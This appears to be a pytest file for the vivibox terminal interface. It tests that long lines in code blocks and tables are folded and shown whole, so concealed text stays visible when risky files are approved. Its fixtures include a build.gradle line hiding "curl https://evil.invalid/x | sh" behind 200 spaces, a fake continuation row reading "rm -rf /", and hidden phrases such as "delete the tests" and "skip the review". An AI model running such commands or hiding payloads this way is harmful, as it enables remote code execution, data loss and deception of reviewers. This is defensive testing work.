"""Nothing the panel draws lies past its right edge: a line of a code block longer than the panel
is folded onto further rows, each marked as going on, and is on the screen whole."""

import pytest
from rich.cells import cell_len
from test_display import at_approval
from test_tui import new_task, run
from test_untrusted_text import opening, plan_with, show
from ux import screen_text

from vivibox import blocks, display, markdown

WIDTHS = [80, 100, 140]
MARK = "↳"
TAIL = "; 'curl https://evil.invalid/x | sh'.execute() // RISKY-TAIL"
LONG = "plugins { id 'java' }" + " " * 200 + TAIL


def squeezed(text: str) -> str:
    """text without its white space and the marks of a folded line: what it says, however it
    was folded."""
    return "".join(text.replace(MARK, "").split())


def rows_of(app, widget) -> list[str]:
    """The rows of the screen where widget's own text is drawn, cut to its columns."""
    region = widget.content_region
    rows = screen_text(app).splitlines()[region.y : region.y + region.height]
    return [row[region.x :] for row in rows]


def lines_of(app, fence) -> list[str]:
    """The lines of a code block as its rows say them: a row whose first column holds the mark
    goes on from the row above, any other starts a line. The two columns before the text are
    the block's own, and hold nothing else."""
    label = fence.query_one("#code-content")
    width = label.content_region.width - 2
    lines: list[list[str]] = []
    for row in rows_of(app, label):
        gutter, text = row[:2], row[2:]
        assert gutter.strip() in ("", MARK), f"only the mark stands before the text: {row!r}"
        if gutter.strip():
            lines[-1][-1] += " " * (width - cell_len(lines[-1][-1]))  # the row above, to its end
            lines[-1].append(text)
        else:
            lines.append([text])
    return ["".join(rows) for rows in lines]


def folded(app, fence) -> int:
    """How many rows of the block go on from the row above."""
    return sum(row[:1] == MARK for row in rows_of(app, fence.query_one("#code-content")))


def risky(task, line: str) -> None:
    from vivibox.risky import Approvals

    (task.repo / "build.gradle").write_text("plugins { id 'java' }\n")
    Approvals(task.meta, task.repo).approve()
    (task.repo / "build.gradle").write_text(line + "\n")
    at_approval(task)


@pytest.mark.parametrize("width", WIDTHS)
def test_a_long_line_of_a_risky_file_is_on_the_screen_whole(env, monkeypatch, width):
    """Where you approve risky files "as shown": a line of build.gradle with 200 spaces after
    its harmless start showed the start alone, with no sign that it went on."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        shown = screen_text(app)
        assert "Risky files changed" in shown and "approve the files as shown" in shown
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), "the tail is drawn"
        assert f"+{LONG}" in lines_of(app, fence), "and the line reads as the file has it"
        assert folded(app, fence) == -(-(len(LONG) + 1) // (fence.size.width - 4)) - 1, "a mark on each row"
        assert fence.max_scroll_x == 0, "nothing of it is to the side"
        assert fence.styles.overflow_x == "hidden" and not fence.allow_horizontal_scroll, "and never is"

    run(scenario, size=(width, 60))


def test_vivibox_risky_and_the_panel_show_the_same_line(env, monkeypatch, capsys):
    from vivibox.cli import main

    task = new_task()
    risky(task, LONG)
    capsys.readouterr()
    assert main(["risky", task.id]) == 0
    assert f"+{LONG}" in capsys.readouterr().out.splitlines()


def test_a_row_is_cut_by_the_cells_its_characters_take():
    from textual.content import Content

    def rows(text: str, width: int) -> list[str]:
        return [row.plain for row in blocks._rows(Content(text), width)]

    assert rows("abcdef", 4) == ["abcd", "ef"] and rows("abcd", 4) == ["abcd"] and rows("", 4) == [""]
    assert rows("x漢漢漢", 4) == ["x漢", "漢漢"], "a character of two cells goes to the next row whole"
    assert rows("abcde\u0301f", 5) == ["abcde\u0301", "f"], "a combining mark stays with its letter"
    assert rows("e\u0301" * 6, 4) == ["e\u0301" * 4, "e\u0301" * 2], "and takes no cell"
    assert rows("漢漢", 1) == ["漢", "漢"], "a row holds a character at least"
    assert rows("abcdef", 0) == ["abcdef"], "one row until the width is known"


# A line of each kind that a count of characters gets wrong: two cells a character (after one
# of one cell, so a row ends a cell short), a mark that takes no cell of its own, a tab.
WIDE = "x" + "漢字" * 70 + "WIDE-TAIL"
COMBINING = "é" * 150 + "COMBINING-TAIL"
TABS = "\tx" * 25 + "TABS-TAIL"


@pytest.mark.parametrize("width", WIDTHS)
def test_a_folded_line_counts_wide_and_combining_characters_and_tabs(env, monkeypatch, width):
    task = new_task()
    plan_with(task, display.fenced("\n".join([WIDE, COMBINING, TABS, "short"]), "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        drawn = squeezed("\n".join(rows_of(app, fence)))
        for tail in ("WIDE-TAIL", "COMBINING-TAIL", "TABS-TAIL"):
            assert tail in drawn, tail
        wide, *others = lines_of(app, fence)
        assert squeezed(wide) == WIDE, "whole; a row may end a cell short of the edge"
        assert others == [COMBINING, TABS.expandtabs(8), "short"]
        room = fence.size.width - 4
        assert all(cell_len(row) <= room + 2 for row in rows_of(app, fence)), "no row is past the edge"
        assert fence.max_scroll_x == 0

    run(scenario, size=(width, 100))


def test_a_line_of_a_code_block_cannot_be_drawn_as_the_rest_of_the_line_above(env, monkeypatch):
    """The mark stands in a column of the block's own, where no text of the block is drawn, and
    the same character in the text is shown as its code point."""
    task = new_task()
    written = f"first\n{MARK} rm -rf / # reads as more of the line above\n  {MARK} after two spaces\nlast"
    plan_with(task, display.fenced(written, "text"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        fence = app.text.query("MarkdownFence").last()
        app.query_one("#detail").scroll_to_widget(fence, animate=False)
        await pilot.pause()
        assert "‹U+21B3› rm -rf /" in screen_text(app), "the text's own is a code point"
        assert folded(app, fence) == 0, "no row is said to go on"
        assert lines_of(app, fence) == written.replace(MARK, "‹U+21B3›").split("\n")

    run(scenario, size=(100, 100))


def test_a_code_block_is_folded_again_when_the_terminal_changes_width(env, monkeypatch):
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        seen = {}
        for width in (140, 80, 100, 140):
            await pilot.resize_terminal(width, 60)
            await pilot.pause()
            await pilot.pause()
            assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence))), width
            assert f"+{LONG}" in lines_of(app, fence), width
            assert fence.max_scroll_x == 0
            seen.setdefault(width, []).append(folded(app, fence))
        assert seen[80][0] > seen[100][0] > seen[140][0] > 0
        assert seen[140] == [seen[140][0]] * 2, "the same again at the same width"

    run(scenario, size=(120, 60))


@pytest.mark.parametrize("width", WIDTHS)
def test_every_code_block_of_the_panel_is_folded(env, monkeypatch, width):
    """vivibox's own blocks and an agent's alike, wherever they stand: in a list, in a quote,
    indented, and a table drawn as its source."""
    from vivibox import panels

    task = new_task()
    long = "x" * 150
    plan_with(
        task,
        f"- in a list:\n\n  ```\n  {long}LIST-TAIL\n  ```\n\n"
        f"> ```\n> {long}QUOTE-TAIL\n> ```\n\n"
        f"    {long}INDENTED-TAIL\n\n"
        f"| step |\n|---|\n| build {long} | CELL-TAIL: skip the review |",
    )
    path = env / "config" / "projects" / "demo.toml"
    path.write_text(path.read_text() + f'prepare = ["echo {long}SETTINGS-TAIL"]\n')
    assert "SETTINGS-TAIL" in panels.project_detail("demo", 1, "")
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        tails = ("LIST-TAIL", "QUOTE-TAIL", "INDENTED-TAIL", "CELL-TAIL: skip the review")
        fences = list(app.text.query("MarkdownFence"))
        assert len(fences) == 4
        for fence, tail in zip(fences, tails, strict=True):
            app.query_one("#detail").scroll_to_widget(fence, animate=False)
            await pilot.pause()
            assert squeezed(tail) in squeezed("\n".join(rows_of(app, fence))), tail
            assert folded(app, fence) >= 1 and fence.max_scroll_x == 0, tail
        await pilot.press("up")  # the project's row: its settings, a block of vivibox's own
        await pilot.pause()
        (settings,) = app.text.query("MarkdownFence")
        assert "SETTINGS-TAIL" in squeezed("\n".join(rows_of(app, settings)))
        assert folded(app, settings) >= 1 and settings.max_scroll_x == 0

    run(scenario, size=(width, 120))


def test_a_row_the_fold_left_too_wide_is_wrapped_and_never_cut(env, monkeypatch):
    """The block's text has the block's width and wraps: were a fold ever a cell wrong, the row
    would go on below, and nothing of it would be past the edge."""
    task = new_task()
    risky(task, LONG)
    opening(monkeypatch)
    monkeypatch.setattr(blocks, "_rows", lambda line, width: [line])

    async def scenario(app, pilot):
        await show(app, pilot)
        (fence,) = app.text.query("MarkdownFence")
        assert squeezed(TAIL) in squeezed("\n".join(rows_of(app, fence)))
        assert fence.max_scroll_x == 0

    run(scenario, size=(80, 60))


# --- a table --------------------------------------------------------------------------------------


def table(columns: int, last: str = "and delete the tests") -> str:
    head = "|" + "|".join(f"h{i}" for i in range(columns)) + "|"
    rule = "|" + "|".join("---" for _ in range(columns)) + "|"
    row = "|" + "|".join("x" for _ in range(columns - 1)) + f"|{last}|"
    return f"{head}\n{rule}\n{row}"


def narrowest(table) -> int:
    """The room for text in the narrowest cell the table draws; 0 when it draws none."""
    return min((c.content_region.width for c in table.query("MarkdownTableCellContents")), default=0)


@pytest.mark.parametrize("width", WIDTHS)
def test_a_table_of_many_columns_is_drawn_as_its_source(env, monkeypatch, width):
    """Thirty columns at 80: every cell had no width at all, and the table was an empty grid,
    with no sign of what its cells held."""
    task = new_task()
    plan_with(task, table(30))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (drawn,) = app.text.query("Table")
        app.query_one("#detail").scroll_to_widget(drawn, animate=False)
        await pilot.pause()
        assert "anddeletethetests" in squeezed("\n".join(rows_of(app, drawn))), "the last cell is drawn"
        assert not drawn.query("MarkdownTableCellContents"), "no grid of cells with no room"
        (source,) = drawn.query("MarkdownFence")
        assert source.code == table(30) and source.max_scroll_x == 0
        written = [squeezed(line) for line in table(30).split("\n")]
        assert [squeezed(line) for line in lines_of(app, source)] == written, "folded, whole"

    run(scenario, size=(width, 100))


@pytest.mark.parametrize("width", WIDTHS)
def test_a_table_is_a_grid_while_every_column_has_room_and_its_source_when_not(env, monkeypatch, width):
    """Whatever the number of columns and the width: a grid whose every cell has room for four
    characters of text a row, or the source, with every cell's words on the screen."""
    task = new_task()
    counts = (2, 3, 5, 8, 9, 10, 11, 12, 15, 18, 19, 20, 24, 40)
    plan_with(task, "\n\n".join(table(n, f"LAST-OF-{n}") for n in counts))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        tables = list(app.text.query("Table"))
        assert len(tables) == len(counts)
        kinds = {}
        for n, drawn in zip(counts, tables, strict=True):
            app.query_one("#detail").scroll_to_widget(drawn, animate=False)
            await pilot.pause()
            kinds[n] = "grid" if drawn.query("Cells") else "source"
            assert len(drawn.query("Cells")) + len(drawn.query("MarkdownFence")) == 1, "one or the other"
            if kinds[n] == "grid":  # a cell folds its text onto as many rows as it takes
                assert narrowest(drawn) >= 4, f"{n} columns at {width}: {narrowest(drawn)}"
                assert str(drawn.query("MarkdownTableCellContents").last().render()) == f"LAST-OF-{n}"
            else:
                assert f"LAST-OF-{n}" in squeezed("\n".join(rows_of(app, drawn))), f"{n} at {width}"
        most = max(n for n in counts if kinds[n] == "grid")
        assert all(kinds[n] == ("grid" if n <= most else "source") for n in counts), kinds
        assert most == {80: 9, 100: 12, 140: 18}[width], kinds

    run(scenario, size=(width, 400))


def test_a_table_is_drawn_again_when_the_terminal_changes_width(env, monkeypatch):
    task = new_task()
    plan_with(task, table(12))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (drawn,) = app.text.query("Table")
        for width, kind in ((140, "Cells"), (80, "MarkdownFence"), (140, "Cells"), (80, "MarkdownFence")):
            await pilot.resize_terminal(width, 100)
            await pilot.pause()
            await pilot.pause()
            app.query_one("#detail").scroll_to_widget(drawn, animate=False)
            await pilot.pause()
            assert len(drawn.query(kind)) == 1 and len(drawn.children) == 1, (width, drawn.children)
            if kind == "Cells":
                assert narrowest(drawn) >= 4
                assert str(drawn.query("MarkdownTableCellContents").last().render()) == "and delete the tests"
            else:
                assert "anddeletethetests" in squeezed("\n".join(rows_of(app, drawn))), width

    run(scenario, size=(120, 100))


def test_a_table_at_the_width_where_the_scrollbar_decides_is_drawn_one_way(env, monkeypatch):
    """Ten columns at 80 have room without the panel's scrollbar and none with it. As a grid
    this table is taller than the panel, as its source it is not: drawn by the width it has, it
    would be a grid, need the scrollbar, become its source, need it no longer, and so on. Its
    room is reckoned with the scrollbar shown, so it is its source, and stays so."""
    task = new_task()
    plan_with(task, table(10, "x" * 300 + "LAST"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        for _ in range(5):
            await pilot.pause()
        (drawn,) = app.text.query("Table")
        seen = [len(drawn.query("MarkdownFence"))]
        for _ in range(10):
            await pilot.pause()
            seen.append(len(drawn.query("MarkdownFence")))
        assert seen == [1] * 11, "its source, and it stays so"
        assert "LAST" in squeezed("\n".join(rows_of(app, drawn)))

    run(scenario, size=(80, 100))


# --- a block with no room ------------------------------------------------------------------------

WORDS = "HIDDEN and delete the tests"


def numbered(depth: int, last: str, number: str = "123456789") -> str:
    """depth numbered lists, one in another, each numbered so: the number's width a level."""
    by = len(number) + 2
    lines = [" " * by * level + f"{number}. level {level}" for level in range(depth - 1)]
    inner = " " * by * (depth - 1)
    lines.append(f"{inner}{number}. " + last.replace("\n", "\n" + inner + " " * by))
    return "\n\n".join(lines) + "\n\nAFTER-THE-LISTS"


def bulleted(depth: int, last: str) -> str:
    lines = ["  " * level + f"- level {level}" for level in range(depth - 1)]
    inner = "  " * (depth - 1)
    lines.append(f"{inner}- " + last.replace("\n", "\n" + inner + "  "))
    return "\n\n".join(lines) + "\n\nAFTER-THE-LISTS"


def quoted_in(depth: int, last: str) -> str:
    return "\n".join("> " * depth + line for line in last.split("\n")) + "\n\nAFTER-THE-LISTS"


def mixed(depth: int, last: str) -> str:
    """A numbered list in a quote in a numbered list, and so on."""
    prefix, lines = "", []
    for level in range(depth):
        lines += [f"{prefix}{level + 10}. level {level}", prefix.rstrip()]
        prefix += "    > "
    lines += [prefix + line for line in last.split("\n")]
    return "\n".join(lines) + "\n\nAFTER-THE-LISTS"


@pytest.mark.parametrize("width,depth", [(80, 6), (100, 8), (80, 5), (140, 9)])
@pytest.mark.parametrize("last", [WORDS, f"see:\n\n```\n{WORDS}\n```"], ids=["words", "code"])
def test_what_stands_in_numbered_lists_is_on_the_screen(env, monkeypatch, width, depth, last):
    """Six numbered lists one in another, each numbered 123456789, take twelve columns a level:
    the paragraph or the code block in the last was drawn nowhere, at any place of the scroll."""
    from test_agent_prose import every_row, said

    task = new_task()
    plan_with(task, numbered(depth, last))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        drawn = said(await every_row(app, pilot))
        assert "AFTER-THE-LISTS" in drawn
        assert "HIDDENanddeletethetests" in drawn, "the writer reads it; the panel draws none of it"

    run(scenario, size=(width, 40))


SHAPES = {"numbered": numbered, "bulleted": bulleted, "quoted": quoted_in, "mixed": mixed}
# The deepest of each that is drawn as markdown: one level more, and a block of it would have
# fewer than ten columns in a terminal of 80.
DEEPEST = {"numbered": 5, "bulleted": 9, "quoted": 19, "mixed": 6}
LASTS = {"words": WORDS, "code": f"see:\n\n```\n{WORDS}\n```", "table": "| a | b |\n|---|---|\n| c | d |"}


@pytest.mark.parametrize("shape", SHAPES)
@pytest.mark.parametrize("last", LASTS)
def test_a_piece_with_a_block_that_has_no_room_at_80_columns_is_its_source(shape, last):
    """Decided on what the parser found, for a terminal of 80 columns, whatever the width is: a
    piece is markdown while every block of it has ten columns there, and its source from the
    first block that has not."""
    from test_agent_prose import apart, parsed

    from vivibox import sections

    for depth in range(1, 13):
        written = SHAPES[shape](depth, LASTS[last])
        own, agents = apart(parsed(sections.plan_text(written)))
        as_source = [t.content for t in agents if t.type == "fence"] == [written + "\n"]
        assert as_source == (depth > DEEPEST[shape]), f"{shape} {depth}"
        assert own == []


@pytest.mark.parametrize("shape", SHAPES)
def test_the_deepest_piece_drawn_as_markdown_has_ten_columns_for_every_block_at_80(env, monkeypatch, shape):
    """The count of columns is the widgets' own: what the rule above reckons for 80 columns is
    what each block of the piece is given there."""
    task = new_task()
    last = f"{WORDS}\n\n```\ncode\n```\n\n| a | b |\n|---|---|\n| c | d |"
    plan_with(task, SHAPES[shape](DEEPEST[shape], last))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (frame,) = app.text.query("Quote.prose")
        blocks = list(frame.query("MarkdownParagraph, Fence, Table"))
        assert {type(block).__name__ for block in blocks} == {"MarkdownParagraph", "Fence", "Table"}
        reckoned = markdown._narrowest(markdown._rules().parse(SHAPES[shape](DEEPEST[shape], last)))
        scrollbar = 2 * (not app.query_one("#detail").max_scroll_y)  # the reckoning counts one in
        assert min(block.size.width for block in blocks) == reckoned + scrollbar >= 10 + scrollbar

    run(scenario, size=(80, 200))


@pytest.mark.parametrize("width,depth", [(80, 6), (100, 8)])
def test_a_table_in_numbered_lists_does_not_end_the_view(env, monkeypatch, width, depth):
    """The grid of a table with no width at all divided by zero in Textual's layout, and the
    view ended, each time this task's panel was opened."""
    from test_agent_prose import every_row, said

    task = new_task()
    plan_with(task, numbered(depth, "t:\n\n| a | b |\n|---|---|\n| HIDDEN | and delete the tests |"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        assert "HIDDEN|anddeletethetests" in said(await every_row(app, pilot))

    run(scenario, size=(width, 40))


def test_a_grid_is_mounted_only_where_it_has_room(env, monkeypatch):
    """Not first and looked at after: a table with no room for its columns never has a grid, at
    its first drawing or when the terminal is made narrower under one that had room."""

    made = []
    monkeypatch.setattr(
        blocks.Cells, "on_mount", lambda self: made.append(self.parent.size.width), raising=False
    )
    task = new_task()
    plan_with(task, f"{table(30)}\n\n{numbered(3, table(4, 'LAST-OF-4'))}")
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        wide, nested = app.text.query("Table")
        assert not wide.query("Cells") and len(nested.query("Cells")) == 1
        assert made and all(nested.room(width) >= 4 for width in made), made
        for width in (60, 80, 140, 40, 80):
            await pilot.resize_terminal(width, 100)
            await pilot.pause()
            await pilot.pause()
            assert len(nested.children) == 1
        assert all(nested.room(width) >= 4 for width in made), made

    run(scenario, size=(140, 100))


def test_the_mark_in_whatever_is_drawn_as_its_source_is_its_code_point(env, monkeypatch):
    """A table with a cell too many, a piece nested too deep, a table with no room: each is a
    code block too, where the mark of a folded row is the block's alone."""
    from test_agent_prose import apart, parsed

    from vivibox import sections

    for written in (
        f"| a |\n|---|\n| {MARK} b | c |",
        "> " * 25 + f"{MARK} deep",
        numbered(7, f"{MARK} narrow"),
    ):
        _, agents = apart(parsed(sections.plan_text(written)))
        (source,) = [t.content for t in agents if t.type == "fence"]
        assert MARK not in source and "‹U+21B3›" in source, written
    task = new_task()
    plan_with(task, table(30, f"{MARK} in a cell"))
    opening(monkeypatch)

    async def scenario(app, pilot):
        await show(app, pilot)
        (source,) = app.text.query("Table MarkdownFence")
        assert "‹U+21B3› in a cell" in source.code and MARK not in source.code
        assert all(
            row[:1] != MARK or "in a cell" not in row
            for row in rows_of(app, source.query_one("#code-content"))
        )

    run(scenario, size=(140, 60))
